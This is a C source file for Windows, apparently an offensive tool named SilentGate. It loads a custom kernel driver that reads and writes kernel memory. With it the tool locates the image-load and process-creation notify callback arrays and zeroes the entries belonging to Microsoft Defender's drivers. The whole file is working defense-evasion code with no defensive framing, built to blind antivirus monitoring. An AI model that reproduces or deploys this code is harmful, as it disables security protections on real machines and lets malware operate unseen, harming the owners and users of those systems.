#include <windows.h>
#include <psapi.h>
#include <stdio.h>

#define IOCTL_SG_READ_VIRTUAL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_WRITE_VIRTUAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
typedef struct { ULONG64 address; ULONG size; UCHAR data[256]; } SG_MEM;
static HANDLE g_h = INVALID_HANDLE_VALUE;

BOOL vm_read(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    DWORD bytes=0;
    return DeviceIoControl(g_h,IOCTL_SG_READ_VIRTUAL,
        &req,sizeof(req),buf,size,&bytes,NULL);
}

BOOL vm_write(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    if(req.size>0) memcpy(req.data,buf,req.size);
    DWORD bytes=0;
    return DeviceIoControl(g_h,IOCTL_SG_WRITE_VIRTUAL,
        &req,sizeof(req),&req,sizeof(req),&bytes,NULL);
}

int load_driver(const char* path) {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE ex=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(ex){SERVICE_STATUS ss;ControlService(ex,SERVICE_CONTROL_STOP,&ss);
        DeleteService(ex);CloseServiceHandle(ex);Sleep(500);}
    SC_HANDLE svc=CreateServiceA(scm,"SilentGate","SilentGate",
        SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,path,NULL,NULL,NULL,NULL,NULL);
    if(!svc){CloseServiceHandle(scm);return 0;}
    BOOL ok=StartServiceA(svc,0,NULL);
    CloseServiceHandle(svc);CloseServiceHandle(scm);
    return ok;
}

void unload_driver() {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE svc=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(svc){SERVICE_STATUS ss;ControlService(svc,SERVICE_CONTROL_STOP,&ss);
        Sleep(500);DeleteService(svc);CloseServiceHandle(svc);}
    CloseServiceHandle(scm);
}

DWORD64 get_ntos() {
    DWORD n=0; EnumDeviceDrivers(NULL,0,&n);
    LPVOID* d=(LPVOID*)malloc(n); EnumDeviceDrivers(d,n,&n);
    DWORD64 base=0; char name[MAX_PATH];
    for(DWORD i=0;i<n/sizeof(LPVOID);i++){
        GetDeviceDriverBaseNameA(d[i],name,MAX_PATH);
        if(_stricmp(name,"ntoskrnl.exe")==0||_stricmp(name,"ntkrnlmp.exe")==0)
            {base=(DWORD64)d[i];break;}
    } free(d); return base;
}

void get_driver_name(DWORD64 func, char* out) {
    strcpy(out,"unknown");
    DWORD n=0; EnumDeviceDrivers(NULL,0,&n);
    LPVOID* d=(LPVOID*)malloc(n); EnumDeviceDrivers(d,n,&n);
    for(DWORD i=0;i<n/sizeof(LPVOID);i++){
        DWORD64 base=(DWORD64)d[i];
        if(func>=base && func<base+0x400000){
            GetDeviceDriverBaseNameA(d[i],out,MAX_PATH);
            break;
        }
    }
    free(d);
}

int scan_array(DWORD64 array, const char* label, int remove_defender) {
    printf("[SCAN] %s at 0x%llX\n", label, array);
    DWORD64 entries[64]={0};
    if(!vm_read(array, entries, 512)){
        printf("[SCAN] Read failed\n\n"); return 0;}

    int found=0, removed=0;
    for(int i=0;i<64;i++){
        if(entries[i]==0) continue;
        DWORD64 pool=entries[i]&~0xFULL;
        if(pool<0xFFFF800000000000ULL) continue;
        DWORD64 func=0;
        vm_read(pool+8,&func,8);
        char dname[MAX_PATH]="unknown";
        if(func) get_driver_name(func,dname);

        printf("  [%d] func=0x%llX driver=%s\n",i,func,dname);
        found++;

        /* Remove Defender callbacks */
        if(remove_defender && (
            _stricmp(dname,"WdFilter.sys")==0 ||
            _stricmp(dname,"WdNisDrv.sys")==0 ||
            _stricmp(dname,"MpKslDrv.sys")==0)) {
            DWORD64 zero=0;
            if(vm_write(array+i*8,&zero,8)){
                printf("  [%d] REMOVED %s callback\n",i,dname);
                removed++;
            }
        }
    }
    if(found==0) printf("  No valid callbacks\n");
    printf("  Total: %d found, %d removed\n\n",found,removed);
    return removed;
}

int main() {
    printf("[V9] SilentGate v9.0 - Find and Remove Defender Callbacks\n");
    printf("[V9] Author: JarDani\n\n");

    char drv[MAX_PATH],dir[MAX_PATH];
    GetModuleFileNameA(NULL,dir,MAX_PATH);
    char* p=strrchr(dir,'\\');if(p)*p='\0';
    snprintf(drv,MAX_PATH,"%s\\sg_driver.sys",dir);

    if(!load_driver(drv)){printf("Load failed\n");getchar();return 1;}
    g_h=CreateFileA("\\\\.\\SilentGate",GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

    DWORD64 ntos=get_ntos();
    printf("[V9] ntoskrnl: 0x%llX\n\n",ntos);

    /* Scan all three arrays we found */
    /* LoadImage array found earlier */
    int total=0;
    total += scan_array(0xFFFFF801058EC3E0ULL,
        "LoadImage callbacks", 1);

    /* Now find CreateProcess array */
    /* PsSetCreateProcessNotifyRoutineEx is at ntos+0x799700 */
    /* Follow same CALL chain from that function */
    char ntos_path[MAX_PATH];
    GetSystemDirectoryA(ntos_path,MAX_PATH);
    strcat(ntos_path,"\\ntoskrnl.exe");
    HMODULE disk=LoadLibraryExA(ntos_path,NULL,DONT_RESOLVE_DLL_REFERENCES);

    FARPROC fn2=GetProcAddress(disk,"PsSetCreateProcessNotifyRoutineEx");
    DWORD64 fn2_runtime=ntos+((DWORD64)fn2-(DWORD64)disk);

    BYTE buf[16]={0};
    vm_read(fn2_runtime,buf,16);
    /* Follow CALL at offset if present */
    for(int i=0;i<12;i++){
        if(buf[i]==0xE8){
            INT32 off=*(INT32*)&buf[i+1];
            DWORD64 called=fn2_runtime+i+5+off;
            /* Read called function for LEA */
            BYTE buf2[128]={0};
            vm_read(called,buf2,128);
            for(int j=0;j<120;j++){
                if((buf2[j]==0x48||buf2[j]==0x4C||buf2[j]==0x49)&&buf2[j+1]==0x8D){
                    INT32 roff=*(INT32*)&buf2[j+3];
                    DWORD64 arr=called+j+7+roff;
                    if(arr>0xFFFF800000000000ULL && arr<ntos+0x2000000){
                        printf("[V9] CreateProcess array candidate: 0x%llX\n",arr);
                        total+=scan_array(arr,"CreateProcess callbacks",1);
                    }
                }
            }
            break;
        }
    }

    FreeLibrary(disk);
    printf("[V9] Total Defender callbacks removed: %d\n",total);

    CloseHandle(g_h);
    unload_driver();
    printf("\n[V9] Done - press Enter\n");
    getchar();
    return 0;
}
